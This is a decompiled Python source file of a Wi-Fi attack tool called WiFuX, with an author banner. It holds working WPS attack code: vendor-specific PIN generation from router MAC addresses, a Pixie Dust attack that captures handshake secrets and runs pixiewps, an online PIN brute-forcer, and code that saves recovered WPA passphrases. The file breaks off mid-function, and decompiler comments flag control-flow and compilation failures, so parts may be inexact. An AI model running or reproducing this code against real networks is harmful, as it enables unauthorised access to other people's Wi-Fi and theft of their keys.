# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'obfuscated'
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 2026-03-06 04:11:09 UTC (1772770269)

# irreducible cflow, using cdg fallback
# ***<module>: Failure: Compilation Error
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv
from typing import Dict

print(
    "[1;32m\n██╗    ██╗██╗███████╗██╗   ██╗██╗  ██╗\n██║    ██║██║██╔════╝██║   ██║╚██╗██╔╝\n██║ █╗ ██║██║█████╗  ██║   ██║ ╚███╔╝ \n██║███╗██║██║██╔══╝  ██║   ██║ ██╔██╗ \n╚███╔███╔╝██║██║     ╚██████╔╝██╔╝ ██╗\n ╚══╝╚══╝ ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝[0m\n\n[1;36m╭──────────────────────────────────────────────╮\n[1;36m│ [1;33m✦ [1;32mAuthor  [1;37m: MD Sakibur Rahman (MSR)          [1;36m│\n[1;36m│ [1;33m✦ [1;32mGitHub  [1;37m: msrofficial                      [1;36m│\n[1;36m│ [1;33m✦ [1;32mFacebook[1;37m: sakibur.msr                      [1;36m│\n[1;36m│ [1;33m✦ [1;32mWebsite [1;37m: https://msrsakibur.netlify.app   [1;36m│\n[1;36m╰──────────────────────────────────────────────╯[0m\n       [1;35m★ [1;32mVersion [1;37m: [1;32mv2.0 [1;31m(Latest Release)[0m\n\n[1;37m[[1;31m![1;37m] [1;33mUpdate: Type [1;32mwifux update[1;33m in termux[0m\n"
)


class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        else:
            if isinstance(mac, str):
                self._str_repr = mac.replace("-", ":").replace(".", ":").upper()
                self._int_repr = self._mac2int(mac)
            else:
                raise ValueError("MAC address must be string or integer")

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other
        return self

    def __isub__(self, other):
        self.integer -= other
        return self

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(":", ""), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split("x")[(-1)].upper()
        mac = mac.zfill(12)
        mac = ":".join((mac[i : i + 2] for i in range(0, 12, 2)))
        return mac

    def __repr__(self):
        return "NetworkAddress(string={}, integer={})".format(
            self._str_repr, self._int_repr
        )


class WPSpin:
    """WPS pin generator"""

    def __init__(self):
        # ***<module>.WPSpin.__init__: Failure: Compilation Error
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2
        self.algos = {
            "pin24": {"name": "24-bit PIN", "mode": self.ALGO_MAC, "gen": self.pin24},
            "pin28": {"name": "28-bit PIN", "mode": self.ALGO_MAC, "gen": self.pin28},
            "pin32": {"name": "32-bit PIN", "mode": self.ALGO_MAC, "gen": self.pin32},
            "pinDLink": {
                "name": "D-Link PIN",
                "mode": self.ALGO_MAC,
                "gen": self.pinDLink,
            },
            "pinDLink1": {
                "name": "D-Link PIN +1",
                "mode": self.ALGO_MAC,
                "gen": self.pinDLink1,
            },
            "pinASUS": {"name": "ASUS PIN", "mode": self.ALGO_MAC, "gen": self.pinASUS},
            "pinAirocon": {
                "name": "Airocon Realtek",
                "mode": self.ALGO_MAC,
                "gen": self.pinAirocon,
            },
            "pinEmpty": {
                "name": "Empty PIN",
                "mode": self.ALGO_EMPTY,
                "gen": lambda mac: "",
            },
            "pinCisco": {
                "name": "Cisco",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 1234567,
            },
            "pinBrcm1": {
                "name": "Broadcom 1",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 2017252,
            },
            "pinBrcm2": {
                "name": "Broadcom 2",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 4626484,
            },
            "pinBrcm3": {
                "name": "Broadcom 3",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 7622990,
            },
            "pinBrcm4": {
                "name": "Broadcom 4",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 6232714,
            },
            "pinBrcm5": {
                "name": "Broadcom 5",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 1086411,
            },
            "pinBrcm6": {
                "name": "Broadcom 6",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 3195719,
            },
            "pinAiworking": {
                "name": "Airocon",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 3043203,
            },
            "pinInvNIC": {
                "name": "Inv NIC to PIN",
                "mode": self.ALGO_MAC,
                "gen": lambda mac: int(str(mac.integer & 0xFFFFFF)[::-1]),
            },
            "pinNIC2": {
                "name": "NIC * 2",
                "mode": self.ALGO_MAC,
                "gen": lambda mac: (mac.integer & 0xFFFFFF) * 2,
            },
            "pinNIC3": {
                "name": "NIC * 3",
                "mode": self.ALGO_MAC,
                "gen": lambda mac: (mac.integer & 0xFFFFFF) * 3,
            },
            "pinOUIaddNIC": {
                "name": "OUI + NIC",
                "mode": self.ALGO_MAC,
                "gen": lambda mac: (mac.integer >> 24) + (mac.integer & 0xFFFFFF),
            },
            "pinOUIsubNIC": {
                "name": "OUI - NIC",
                "mode": self.ALGO_MAC,
                "gen": lambda mac: (mac.integer >> 24) - (mac.integer & 0xFFFFFF),
            },
            "pinOUIxorNIC": {
                "name": "OUI ^ NIC",
                "mode": self.ALGO_MAC,
                "gen": lambda mac: (mac.integer >> 24) ^ (mac.integer & 0xFFFFFF),
            },
        }

    @staticmethod
    def checksum(pin):
        """\n        Standard WPS checksum algorithm.\n        @pin — A 7 digit pin to calculate the checksum for.\n        Returns the checksum value.\n"""
        accum = 0
        while pin:
            accum += 3 * (pin % 10)
            pin = int(pin / 10)
            accum += pin % 10
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """\n        WPS pin generator\n        @algo — the WPS pin algorithm ID\n        Returns the WPS pin string value\n"""
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError("Invalid WPS pin algorithm")
        else:
            pin = self.algos[algo]["gen"](mac)
            if algo == "pinEmpty":
                return pin
            else:
                pin = pin % 10000000
                pin = str(pin) + str(self.checksum(pin))
                return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        """\n        Get all WPS pin\'s for single MAC\n"""
        res = []
        for ID, algo in self.algos.items():
            if algo["mode"] == self.ALGO_STATIC and (not get_static):
                continue
            item = {}
            item["id"] = ID
            if algo["mode"] == self.ALGO_STATIC:
                item["name"] = "Static PIN — " + algo["name"]
            else:
                item["name"] = algo["name"]
            item["pin"] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        """\n        Get all WPS pin\'s for single MAC as list\n"""
        res = []
        for ID, algo in self.algos.items():
            if algo["mode"] == self.ALGO_STATIC and (not get_static):
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        """\n        Get all suggested WPS pin\'s for single MAC\n"""
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item["id"] = ID
            if algo["mode"] == self.ALGO_STATIC:
                item["name"] = "Static PIN — " + algo["name"]
            else:
                item["name"] = algo["name"]
            item["pin"] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        """\n        Get all suggested WPS pin\'s for single MAC as list\n"""
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        """\n        Get algos suggestions for single MAC\n        Returns the algo ID\n"""
        # ***<module>.WPSpin._suggest: Failure: Compilation Error
        mac = mac.replace(":", "").upper()
        algorithms = {
            "pin24": (
                "04BF6D",
                "0E5D4E",
                "107BEF",
                "14A9E3",
                "28285D",
                "2A285D",
                "32B2DC",
                "381766",
                "404A03",
                "4E5D4E",
                "5067F0",
                "5CF4AB",
                "6A285D",
                "8E5D4E",
                "AA285D",
                "B0B2DC",
                "C86C87",
                "CC5D4E",
                "CE5D4E",
                "EA285D",
                "E243F6",
                "EC43F6",
                "EE43F6",
                "F2B2DC",
                "FCF528",
                "FEF528",
                "4C9EFF",
                "0014D1",
                "D8EB97",
                "1C7EE5",
                "84C9B2",
                "FC7516",
                "14D64D",
                "9094E4",
                "BCF685",
                "C4A81D",
                "00664B",
                "087A4C",
                "14B968",
                "2008ED",
                "346BD3",
                "4CEDDE",
                "786A89",
                "88E3AB",
                "D46E5C",
                "E8CD2D",
                "EC233D",
                "ECCB30",
                "F49FF3",
            ),
            "pin28": (
                "2008ED",
                "AA285D",
                "EA285D",
                "1C7EE5",
                "84C9B2",
                "FC7516",
                "14D64D",
            ),
            "pin32": ("14D64D", "1C7EE5", "84C9B2", "FC7516"),
            "pinDLink": (
                "14D64D",
                "1C7EE5",
                "28107B",
                "84C9B2",
                "A0AB1B",
                "B8A386",
                "C0A0BB",
                "CCB255",
                "FC7516",
                "F84ABF",
            ),
            "pinDLink1": (
                "0018E7",
                "00195B",
                "001CF0",
                "001E58",
                "002191",
                "0022B0",
                "002401",
                "00265A",
                "14D64D",
                "1C7EE5",
                "340804",
                "5CD998",
                "84C9B2",
                "B8A386",
                "C8BE19",
                "C8D3A3",
                "CCB255",
                "FC7516",
            ),
            "pinASUS": (
                "049226",
                "04D9F5",
                "08606E",
                "086266",
                "10BF48",
                "10C37B",
                "14DDA9",
                "1C872C",
                "1CB72C",
                "2C4D54",
                "2CFDA1",
                "305A3A",
                "382C4A",
                "38D547",
                "40167E",
                "50465D",
                "54A050",
                "6045CB",
                "60A44C",
                "704D7B",
                "74D02B",
                "7824AF",
                "88D7F6",
                "9C5C8E",
                "AC220B",
                "AC9E17",
                "B06EBF",
                "BCEE7B",
                "C86000",
                "D017C2",
                "D850E6",
                "E03F49",
                "F07959",
                "F46D04",
            ),
            "pinAirocon": (
                "000726",
                "000B2B",
                "000EF4",
                "001333",
                "00177C",
                "001AEF",
                "00E04C",
            ),
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac[:6] in masks:
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return mac.integer & 16777215

    def pin28(self, mac):
        return mac.integer & 268435455

    def pin32(self, mac):
        return mac.integer % 4294967296

    def pinDLink(self, mac):
        nic = mac.integer & 16777215
        pin = nic ^ 5614165
        pin ^= (
            ((pin & 15) << 4)
            + ((pin & 15) << 8)
            + ((pin & 15) << 12)
            + ((pin & 15) << 16)
            + ((pin & 15) << 20)
        )
        pin %= int(10000000.0)
        if pin < int(1000000.0):
            pin += pin % 9 * int(1000000.0) + int(1000000.0)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(":")]
        pin = ""
        for i in range(7):
            pin += str(
                (b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7)
            )
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(":")]
        pin = (
            (b[0] + b[1]) % 10
            + (b[5] + b[0]) % 10 * 10
            + (b[4] + b[5]) % 10 * 100
            + (b[3] + b[4]) % 10 * 1000
            + (b[2] + b[3]) % 10 * 10000
            + (b[1] + b[2]) % 10 * 100000
            + (b[0] + b[1]) % 10 * 1000000
        )
        return pin


def recvuntil(pipe, what):
    s = ""
    while True:
        inp = pipe.stdout.read(1)
        if inp == "":
            return s
        else:
            s += inp
            if what in s:
                return s


def get_hex(line):
    a = line.split(":", 3)
    return a[2].replace(" ", "").upper()


class PixiewpsData:
    def __init__(self):
        self.pke = ""
        self.pkr = ""
        self.e_hash1 = ""
        self.e_hash2 = ""
        self.authkey = ""
        self.e_nonce = ""

    def clear(self):
        self.__init__()

    def got_all(self):
        return (
            self.pke
            and self.pkr
            and self.e_nonce
            and self.authkey
            and self.e_hash1
            and self.e_hash2
        )

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
            self.pke, self.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce
        )
        if full_range:
            pixiecmd += " --force"
        return pixiecmd


class ConnectionStatus:
    def __init__(self):
        self.status = ""
        self.last_m_message = 0
        self.essid = ""
        self.wpa_psk = ""

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ""
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = (0.9090909090909091 + int(self.mask[4:]) / 11000) * 100
        print(
            "[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)".format(
                percentage, self.start_time, average_pin_time
            )
        )

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class Companion:
    """Main application part"""

    def __init__(self, interface, save_result=False, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".conf", delete=False
        ) as temp:
            temp.write(
                "ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n".format(
                    self.tempdir
                )
            )
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()
        self.res_socket_file = (
            f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        )
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)
        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()
        user_home = str(pathlib.Path.home())
        self.sessions_dir = f"{user_home}/.WiFuX/sessions/"
        self.pixiewps_dir = f"{user_home}/.WiFuX/pixiewps/"
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + "/reports/"
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)
        self.generator = WPSpin()

    def __init_wpa_supplicant(self):
        print("[*] Running wpa_supplicant…")
        cmd = "wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}".format(
            self.interface, self.tempconf
        )
        self.wpas = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            encoding="utf-8",
            errors="replace",
        )
        while not os.path.exists(self.wpas_ctrl_path):
            pass

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        b, address = self.retsock.recvfrom(4096)
        inmsg = b.decode("utf-8", errors="replace")
        return inmsg

    def __handle_wpas(self, pixiemode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip("\n")
        if verbose:
            sys.stderr.write(line + "\n")
        if line.startswith("WPS: "):
            if "Building Message M" in line:
                n = int(line.split("Building Message M")[1].replace("D", ""))
                self.connection_status.last_m_message = n
                print("[*] Sending WPS Message M{}…".format(n))
            elif "Received M" in line:
                n = int(line.split("Received M")[1])
                self.connection_status.last_m_message = n
                print("[*] Received WPS Message M{}".format(n))
                if n == 5:
                    print("[+] The first half of the PIN is valid")
            elif "Received WSC_NACK" in line:
                self.connection_status.status = "WSC_NACK"
                print("[*] Received WSC NACK")
                print("[-] Error: wrong PIN code")
            elif "Enrollee Nonce" in line and "hexdump" in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert len(self.pixie_creds.e_nonce) == 32
                if pixiemode:
                    print("[P] E-Nonce: {}".format(self.pixie_creds.e_nonce))
            elif "DH own Public Key" in line and "hexdump" in line:
                self.pixie_creds.pkr = get_hex(line)
                assert len(self.pixie_creds.pkr) == 384
                if pixiemode:
                    print("[P] PKR: {}".format(self.pixie_creds.pkr))
            elif "DH peer Public Key" in line and "hexdump" in line:
                self.pixie_creds.pke = get_hex(line)
                assert len(self.pixie_creds.pke) == 384
                if pixiemode:
                    print("[P] PKE: {}".format(self.pixie_creds.pke))
            elif "AuthKey" in line and "hexdump" in line:
                self.pixie_creds.authkey = get_hex(line)
                assert len(self.pixie_creds.authkey) == 64
                if pixiemode:
                    print("[P] AuthKey: {}".format(self.pixie_creds.authkey))
            elif "E-Hash1" in line and "hexdump" in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert len(self.pixie_creds.e_hash1) == 64
                if pixiemode:
                    print("[P] E-Hash1: {}".format(self.pixie_creds.e_hash1))
            elif "E-Hash2" in line and "hexdump" in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert len(self.pixie_creds.e_hash2) == 64
                if pixiemode:
                    print("[P] E-Hash2: {}".format(self.pixie_creds.e_hash2))
            elif "Network Key" in line and "hexdump" in line:
                self.connection_status.status = "GOT_PSK"
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode(
                    "utf-8", errors="replace"
                )
        elif ": State: " in line:
            if "-> SCANNING" in line:
                self.connection_status.status = "scanning"
                print("[*] Scanning…")
        elif "WPS-FAIL" in line and self.connection_status.status != "":
            self.connection_status.status = "WPS_FAIL"
            print("[-] wpa_supplicant returned WPS-FAIL")
        elif "Trying to authenticate with" in line:
            self.connection_status.status = "authenticating"
            if "SSID" in line:
                self.connection_status.essid = (
                    codecs.decode(
                        "'".join(line.split("'")[1:(-1)]),
                        "unicode-escape",
                    )
                    .encode("latin1")
                    .decode("utf-8", errors="replace")
                )
            print("[*] Authenticating…")
        elif "Authentication response" in line:
            print("[+] Authenticated")
        elif "Trying to associate with" in line:
            self.connection_status.status = "associating"
            if "SSID" in line:
                self.connection_status.essid = (
                    codecs.decode(
                        "'".join(line.split("'")[1:(-1)]),
                        "unicode-escape",
                    )
                    .encode("latin1")
                    .decode("utf-8", errors="replace")
                )
            print("[*] Associating with AP…")
        elif "Associated with" in line and self.interface in line:
            bssid = line.split()[(-1)].upper()
            if self.connection_status.essid:
                print(
                    "[+] Associated with {} (ESSID: {})".format(
                        bssid, self.connection_status.essid
                    )
                )
            else:
                print("[+] Associated with {}".format(bssid))
        elif "EAPOL: txStart" in line:
            self.connection_status.status = "eapol_start"
            print("[*] Sending EAPOL Start…")
        elif "EAP entering state IDENTITY" in line:
            print("[*] Received Identity Request")
        elif "using real identity" in line:
            print("[*] Sending Identity Response…")
        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        print("[*] Running Pixiewps…")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        r = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=sys.stdout,
            encoding="utf-8",
            errors="replace",
        )
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if "[+]" in line and "WPS pin" in line:
                    pin = line.split(":")[(-1)].strip()
                    if pin == "<empty>":
                        pin = "''"
                    return pin
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        GREEN = "[1;32m"
        RESET = "[0m"
        print(f"{GREEN}[+] WPS PIN: {wps_pin}{RESET}")
        print(f"{GREEN}[+] WPA PSK: {wpa_psk}{RESET}")
        print(f"{GREEN}[+] AP SSID: {essid}{RESET}")

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + "stored"
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + ".txt", "a", encoding="utf-8") as file:
            file.write(
                "{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n".format(
                    dateStr, bssid, essid, wps_pin, wpa_psk
                )
            )
        writeTableHeader = not os.path.isfile(filename + ".csv")
        with open(filename + ".csv", "a", newline="", encoding="utf-8") as file:
            csvWriter = csv.writer(file, delimiter=";", quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(["Date", "BSSID", "ESSID", "WPS PIN", "WPA PSK"])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f"[i] Credentials saved to {filename}.txt, {filename}.csv")

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + "{}.run".format(bssid.replace(":", "").upper())
        with open(filename, "w") as file:
            file.write(pin)
        print("[i] PIN saved in {}".format(filename))

    def __prompt_wpspin(self, bssid):
        # ***<module>.Companion.__prompt_wpspin: Failure: Different control flow
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print(f"PINs generated for {bssid}:")
            print("{:<3} {:<10} {:<}".format("#", "PIN", "Name"))
            for i, pin in enumerate(pins):
                number = "{})".format(i + 1)
                line = "{:<3} {:<10} {:<}".format(number, pin["pin"], pin["name"])
                print(line)
            while True:
                pinNo = input("Select the PIN: ")
                try:
                    if int(pinNo) in range(1, len(pins) + 1):
                        pin = pins[int(pinNo) - 1]["pin"]
                    else:
                        raise IndexError
                except Exception:
                    print("Invalid number")
                else:
                    return pin
        else:
            if len(pins) == 1:
                pin = pins[0]
                print("[i] The only probable PIN is selected:", pin["name"])
                pin = pin["pin"]
                return pin

    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None):
        # irreducible cflow, using cdg fallback
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)
        print(f"[*] Trying PIN '{pin}'…")
        r = self.sendAndReceive(f"WPS_REG {bssid} {pin}")
        if "OK" not in r:
            self.connection_status.status = "WPS_FAIL"
            if r == "UNKNOWN COMMAND":
                print(
                    '[!] It looks like your wpa_supplicant is compiled without WPS protocol support. Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")'
                )
                return False
            else:
                print("[!] Something went wrong — check out debug log")
                return False
        else:
            while True:
                res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose)
                if not res:
                    break
                elif self.connection_status.status == "WSC_NACK":
                    break
                elif self.connection_status.status == "GOT_PSK":
                    break
                elif self.connection_status.status == "WPS_FAIL":
                    break
        self.sendOnly("WPS_CANCEL")
        return False

    def single_connection(
        self,
        bssid,
        pin=None,
        pixiemode=False,
        showpixiecmd=False,
        pixieforce=False,
        store_pin_on_fail=False,
    ):
        if not pin:
            if pixiemode:
                try:
                    filename = self.pixiewps_dir + "{}.run".format(
                        bssid.replace(":", "").upper()
                    )
                    with open(filename, "r") as file:
                        t_pin = file.readline().strip()
                        if (
                            input(
                                "[?] Use previously calculated PIN {}? [n/Y] ".format(
                                    t_pin
                                )
                            ).lower()
                            != "n"
                        ):
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or "12345670"
                else:
                    pass
            else:
                pin = self.__prompt_wpspin(bssid) or "12345670"
        if store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print("\nAborting…")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)
        if self.connection_status.status == "GOT_PSK":
            self.__credentialPrint(
                pin, self.connection_status.wpa_psk, self.connection_status.essid
            )
            if self.save_result:
                self.__saveResult(
                    bssid,
                    self.connection_status.essid,
                    pin,
                    self.connection_status.wpa_psk,
                )
            filename = self.pixiewps_dir + "{}.run".format(
                bssid.replace(":", "").upper()
            )
            try:
                os.remove(filename)
            except FileNotFoundError:
                return True
            return True
        else:
            if pixiemode:
                if self.pixie_creds.got_all():
                    pin = self.__runPixiewps(showpixiecmd, pixieforce)
                    if pin:
                        return self.single_connection(
                            bssid, pin, pixiemode=False, store_pin_on_fail=True
                        )
                    else:
                        return False
                else:
                    print("[!] Not enough data to run Pixie Dust attack")
                    return False
            else:
                if store_pin_on_fail:
                    self.__savePin(bssid, pin)
                return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        """\n        @f_half — 4-character string\n"""
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + "000")
            pin = "{}000{}".format(f_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print("[+] First half found")
                return f_half
            if self.connection_status.status == "WPS_FAIL":
                print("[!] WPS transaction failed, re-trying last pin")
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print("[-] First half not found")
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        """\n        @f_half — 4-character string\n        @s_half — 3-character string\n"""
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = "{}{}{}".format(f_half, s_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            if self.connection_status.status == "WPS_FAIL":
                print("[!] WPS transaction failed, re-trying last pin")
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if not start_pin:
            try:
                filename = self.sessions_dir + "{}.run".format(
                    bssid.replace(":", "").upper()
                )
                with open(filename, "r") as file:
                    if (
                        input(
                            "[?] Restore previous session for {}? [n/Y] ".format(bssid)
                        ).lower()
                        != "n"
                    ):
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = "0000"
        else:
            mask = start_pin[:7]
        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and self.connection_status.status != "GOT_PSK":
                    self.__second_half_bruteforce(bssid, f_half, "001", delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
        except KeyboardInterrupt:
            print("\nAborting…\nStay With\nTHBD")
            filename = self.sessions_dir + "{}.run".format(
                bssid.replace(":", "").upper()
            )
            with open(filename, "w") as file:
                file.write(self.bruteforce.mask)
            print("[i] Session saved in {}".format(filename))
            if args.loop:
                raise KeyboardInterrupt

    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)

    def __del__(self):
        self.cleanup()


class WiFiScanner:
    """docstring for WiFiScanner"""

    def __init__(self, interface, vuln_list=None):
        # irreducible cflow, using cdg fallback
        # ***<module>.WiFiScanner.__init__: Failure: Compilation Error
        self.interface = interface
        self.vuln_list = vuln_list
        reports_fname = (
            os.path.dirname(os.path.realpath(__file__)) + "/reports/stored.csv"
        )
        try:
            with open(
                reports_fname, "r", newline="", encoding="utf-8", errors="replace"
            ) as file:
                csvReader = csv.reader(file, delimiter=";", quoting=csv.QUOTE_ALL)
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append((row[1], row[2]))
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self) -> Dict[int, dict]:
        """Parsing iw scan results"""

        def handle_network(line, result, networks):
            networks.append(
                {
                    "Security type": "Unknown",
                    "WPS": False,
                    "WPS locked": False,
                    "Model": "",
                    "Model number": "",
                    "Device name": "",
                }
            )
            networks[(-1)]["BSSID"] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[(-1)]["ESSID"] = (
                codecs.decode(d, "unicode-escape")
                .encode("latin1")
                .decode("utf-8", errors="replace")
            )

        def handle_level(line, result, networks):
            networks[(-1)]["Level"] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[(-1)]["Security type"]
            if result.group(1) == "capability":
                if "Privacy" in result.group(2):
                    sec = "WEP"
                else:
                    sec = "Open"
            else:
                if sec == "WEP":
                    if result.group(1) == "RSN":
                        sec = "WPA2"
                    else:
                        if result.group(1) == "WPA":
                            sec = "WPA"
                else:
                    if sec == "WPA":
                        if result.group(1) == "RSN":
                            sec = "WPA/WPA2"
                    else:
                        if sec == "WPA2":
                            if result.group(1) == "WPA":
                                sec = "WPA/WPA2"
            networks[(-1)]["Security type"] = sec

        def handle_wps(line, result, networks):
            networks[(-1)]["WPS"] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[(-1)]["WPS locked"] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[(-1)]["Model"] = (
                codecs.decode(d, "unicode-escape")
                .encode("latin1")
